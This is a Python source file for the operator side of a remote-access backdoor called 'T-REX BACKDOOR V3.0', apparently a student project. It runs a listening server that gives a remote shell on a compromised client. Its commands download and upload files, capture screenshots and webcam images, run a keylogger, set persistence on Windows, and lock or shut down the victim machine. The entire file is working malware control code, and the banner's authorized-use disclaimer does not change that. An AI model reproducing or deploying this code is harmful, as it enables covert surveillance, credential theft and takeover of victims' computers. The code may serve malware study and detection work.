#!/usr/bin/python3
#_*_ coding: utf8 _*_

"""
    Made by:
        - Camilo Laiton

        University of Magdalena, Colombia
        2020-1
        GitHub: https://github.com/camilolaiton/
"""

import socket
import os, base64, subprocess, getpass, struct

# Colors
bold = '\033[1m'
underlined = '\033[4m'
blink_action = '\033[5m'
white_color = '\033[1;97m'
green_color = '\033[1;32m'
red_color = '\033[1;31m'
blue_color = '\033[1;34m'
yellow_color = '\033[1;33m'
purple_color = '\033[1;35m'
end_color = '\033[1;m'

social_color = '\033[1;35m~>'
info_color = '\033[1;33m[!]\033[1;m'
que_color = '\033[1;34m[?]\033[1;m'
bad_color = '\033[1;31m[-]\033[1;m'
good_color = '\033[1;32m[+]\033[1;m'
run_color = '\033[1;97m[>]\033[1;m'
comm_color = '\033[1;m '

# def __del_target(self, intTarget):
#     self.__targets[intTarget].close()
#     self.__targets.pop(intTarget)
#     self.__connected_ips.pop(intTarget)

#     if (self.__current_id == 0):
#         self.__current_id = None
#     else:
#         self.__current_id -= 1

# def __refresh_connections(self):
#     changes = False

#     for intTarget in range(0, len(self.__targets)):
#         try:
#             self.__targets[intTarget].send("--test".encode(self.__CODIFICATOR))
#         except socket.error:
#             self.__del_target(intTarget)
#             changes = True

#     return changes

class Server():

    def __init__(self, ip_addrs, up_port, n_connections=2):
        self.ip_addrs = ip_addrs
        self.up_port = up_port
        self.connected = False

        self.__server = None
        self.__connected_ip = None    # Tupla con la info de dirección ip que se conecto y el puerto
        self.__current_target = None    # Objeto de la conexión para interactuar, enviar recibir datos
        self.__N_CONNECTIONS = n_connections

        self.__CODIFICATOR = 'utf-8'
        
        self.__encode_text_data = lambda text_data: base64.b64encode(text_data.encode(self.__CODIFICATOR))
        self.__decode_text_data = lambda text_data: base64.b64decode(text_data).decode(self.__CODIFICATOR, errors='ignore')

        self.__encode_byte_data = lambda byte_data : base64.b64encode(byte_data)
        self.__decode_byte_data = lambda byte_data : base64.b64decode(byte_data)

    def startServer(self):
        self.__show_banner()
        self.__server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Ipv4, puertos tcp
        self.__server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  #Solo sockets, una vez cerrar herramienta dirección ip y puerto reusables
        self.__server.bind((self.ip_addrs, self.up_port))
        self.__server.listen(self.__N_CONNECTIONS)

        print("%s Server running... Waiting for connections!" % (good_color))

        self.__current_target, self.__connected_ip = self.__server.accept()
        
        print("%s Received connection from: %s" % (good_color, str(self.__connected_ip[0])) )
        self.connected = True
        
    def auth(self):
        
        print("\n%s Insert credentials!" % (info_color))
        user = input("%s Username: " % (que_color))
        password = getpass.getpass("%s Password: " %(que_color))            
        info = self.__encode_text_data(user+password)
        
        if ( self.__send_to_target(info)):
            # print("LOGIN")
            res = self.__decode_text_data(self.__recv_msg())
            
            format_color = bad_color
            
            if (res == "LOGGED"):
                format_color = good_color
                self.connected = True
            else:
                self.connected = False
            
            print("{} {}".format(format_color, res))

        return self.connected
            
    def closeServer(self):
        self.__server.close()
        self.connected = False

    def __send_to_target(self, msg):
        try:
            # print("TAMAÑO MSG: ", len(msg))
            msg = struct.pack('>I', len(msg)) + msg
            self.__current_target.send(msg)
        except socket.error:
            print("%s Lost connection with client!" % (info_color))
            return False
        return True

    def __recv_bytes(self, nbytes):
        data = b''

        while (len(data) < nbytes):
            packet = self.__current_target.recv(nbytes - len(data))

            if not (packet):
                return None
            
            data += packet

        return data

    def __recv_msg(self):   # Principal
        msg_length = self.__recv_bytes(4)

        if not (msg_length):
            return None

        msg_length = struct.unpack('>I', msg_length)[0]
        # print("Tamaño mensaje recibir: ", msg_length)
        data = self.__recv_bytes(msg_length)
        # print("recv DATA: ", data)
        return (data)

    def __dowload_file_from_client(self, command):
        
        data = self.__recv_msg()
        
        if (self.__decode_text_data(data) == "false"):
            print("%s File doesn't exist!" % (bad_color))
        
        elif (self.__decode_text_data(data) == "error"):
            print("%s There's an error trying to download the file!" % (bad_color))

        else:
            with open(command[9:], 'wb') as file:
                file.write(self.__decode_byte_data(data))

    def __upload_file_to_client(self, command):

        if (os.path.exists(command[9:])):
            try:
                with open(command[9:], 'rb') as file_upload:
                    self.__send_to_target(self.__encode_byte_data(file_upload.read()))

                print("%s File sent!" % (good_color))
            except:
                print("%s There's an error with the upload" %(bad_color))
        else:
            print("%s File doesn't exist" % (bad_color))

    def __get_picture(self, command, folder_name, counter):

        IMAGE_FOLDER = folder_name
        
        if not (os.path.exists(IMAGE_FOLDER)):
            os.mkdir(IMAGE_FOLDER)
            print("%s Folder %s created!" % (good_color, IMAGE_FOLDER))

        IMAGE_NAME = "/image_%d.jpg"

        if (folder_name == "screenshots"):
            IMAGE_NAME = "/screenshot_%d.png"

        self.__send_to_target(self.__encode_text_data(command))

        data = self.__recv_msg()
        decoded_data = self.__decode_byte_data(data)
        
        if (decoded_data == b'failure'):
            print("%s Image couldn't be taken." % (bad_color))
        else:
            
            with open(IMAGE_FOLDER + IMAGE_NAME % counter, 'wb') as image:
                
                while (decoded_data != b'eof'):
                    image.write(decoded_data)
                    decoded_data = self.__decode_byte_data(self.__recv_msg())
    
            print("%s Image %d saved in %s" % (good_color, counter, IMAGE_FOLDER))
            counter += 1
        
        return counter

    def __keylogger(self, command, counter):
        
        self.__send_to_target(self.__encode_text_data(command))
        res = self.__decode_text_data(self.__recv_msg())

        option = command[9:]

        if (option == "-s"):
            print("{} {}".format(good_color, res))
        
        elif (option == "-x"):
            print("{} {}".format(bad_color, res))

        elif ("-d" in option):
            
            if (res == "false"):
                res = self.__decode_text_data(self.__recv_msg())
                print("{} {}".format(bad_color, res))
            
            else:
                res = self.__decode_text_data(self.__recv_msg())
                print("{} Keys typed: {}".format(info_color, res))
                res = self.__decode_text_data(self.__recv_msg())
                print("{} Info: {}".format(good_color, res))

                if ("f" in option):
                    FOLDER_PATH = "keyrexLogs"
                    counter = self.__create_keyrex_file(FOLDER_PATH, res, counter)
                else:
                    print("{} Invalid extra option!".format(bad_color))
        
        else:
            print("{} {}".format(bad_color, res))

        return counter

    def __create_keyrex_file(self, folderpath, info, counter):
        
        if not (os.path.exists(folderpath)):
            os.mkdir(folderpath)
            print("%s Folder %s created!" % (good_color, folderpath))

        FILENAME = "/keyrex_log_%d.txt"

        with open(folderpath + FILENAME % counter, 'w') as keyrexFile:
            keyrexFile.write(info)

        print("{} Information saved in folder {}!".format(good_color, folderpath))
        counter += 1
        
        return counter

    def __other_commands(self, command):
        # print("OTHER COMMANDS")
        self.__send_to_target(self.__encode_text_data(command))
        res = self.__decode_text_data(self.__recv_msg())
        print("%s Server response\n" % (good_color))
        print("{}{}".format(yellow_color, res))
        
    def __show_help(self):
        print("%s Usage tool information" % (info_color))
        print("\n%s--help -> Shows help menu" % (yellow_color))
        print("--exit -> Exits server program")
        print("--download [client_path] -> Downloads a file from the current client")
        print("--upload [server_path] -> Uploads a file from the server to client")
        print("--get [URL] -> Downloads a file from a URL")
        print("--run [program] -> Runs an installed software")
        print("--userinfo -> Shows system's client information")
        print("--screen -> Takes a screnshot from the current client")
        print("--test -> Tests current client connection")
        print("--camera -> Takes a picture from current client's camera")
        print("--keyrex [-s, -x, -d, -df] -> Starts, stops and dumps a keylogger in client's machine")
        print("--persistence [-s, -x, -c]-> Creates, deletes and checks persistence (Windows)")
        print("--lock -> Locks current client PC (Windows)")
        print("--shutdown -> Shutdowns current client PC (Windows)")
        print("--restart -> Restarts current client PC (windows)")
        print("\n%sNOTE: You can also execute other commands like cd, mkdir...%s" % (green_color, white_color))
        print("%s github: camilolaiton" % (social_color))

    def __show_banner(self):
        #http://patorjk.com/software/taag/#p=display&f=Doom&t=T-REX
        print(" %s_____     ______ _______   __" % (red_color))
        print("|_   _|    | ___ \  ___\ \ / /")
        print("  | |______| |_/ / |__  \ V / ")
        print("  | |______|    /|  __| /   \ ")
        print("  | |      | |\ \| |___/ /^\ \\")
        print("  \_/      \_| \_\____/\/   \/%s" % (white_color))

        print("%s----┏━☆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓----" % (purple_color))
        print("----┃ T-REX BACKDOOR V3.0           ┃----")
        print("----┃ Author: Camilo Laiton         ┃----")
        print("----┃ SITE: github.com/camilolaiton ┃----")
        print("----┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛----%s" % (white_color))

        print("\n%sDisclaimer: This tool is designed for security testing in an authorized simulated cyberattack. Attacking targets without prior mutual consent is illegal and you will be possible sent to jail if you don't obey all aplicable local, state and federal laws.%s" %(red_color, white_color))
        print("\n%s Developers assume no liability and are not responsible for any misuse or damage caused by this program. It has just been made just for academic reasons.%s\n" % (info_color, white_color))
        print("%s Starting T-Rex...\n" % (info_color))
        
    def sending_shell(self):
        shot_counter = 0
        camera_counter = 0
        keyrex_counter = 0
        current_dir = self.__recv_msg()
        current_dir = self.__decode_text_data(current_dir)

        while (True):
            command = input("{}{}{}~#:{}".format(underlined, blue_color, current_dir, comm_color))

            if (command == '--exit'):
                self.__send_to_target(self.__encode_text_data(command))
                break

            elif (command[:2] == "cd"):
                if (self.__send_to_target(self.__encode_text_data(command))):
                    res = self.__decode_text_data(self.__recv_msg())
                    current_dir = res
                    # print("%s Changing current dir to: %s" % (good_color, current_dir))
                else:
                    break
                
            elif (command[:10] == "--download"):
                if (self.__send_to_target(self.__encode_text_data(command))):
                    self.__dowload_file_from_client(command)
                else:
                    break

            elif (command[:8] == "--upload"):
                if (self.__send_to_target(self.__encode_text_data(command))):
                    self.__upload_file_to_client(command)
                else:
                    break

            elif (command[:8] == "--screen"):
                shot_counter = self.__get_picture(command, 'screenshots', shot_counter)
            
            elif (command[:8] == "--camera"):
                camera_counter = self.__get_picture(command, 'camera', camera_counter)

            elif (command[:8] == "--keyrex"):
                keyrex_counter = self.__keylogger(command, keyrex_counter)

            elif (command[:6] == "--help"):
                self.__show_help()

            elif (command == ""):
                print("%s Please insert a command..." % (que_color))
                pass

            else:
                self.__other_commands(command)

def main():
    IP_ADDRS = '192.168.0.4'
    UP_PORT = 7777
    N_CONNECTIONS = 2

    # IP_ADDRS = '127.0.0.1'
    # UP_PORT = 7777
    # N_CONNECTIONS = 2

    server1 = Server(IP_ADDRS, UP_PORT, N_CONNECTIONS)
    server1.startServer()
    
    if ( server1.auth() ):
        server1.sending_shell()
    
    server1.closeServer()

if __name__ == "__main__":
    main()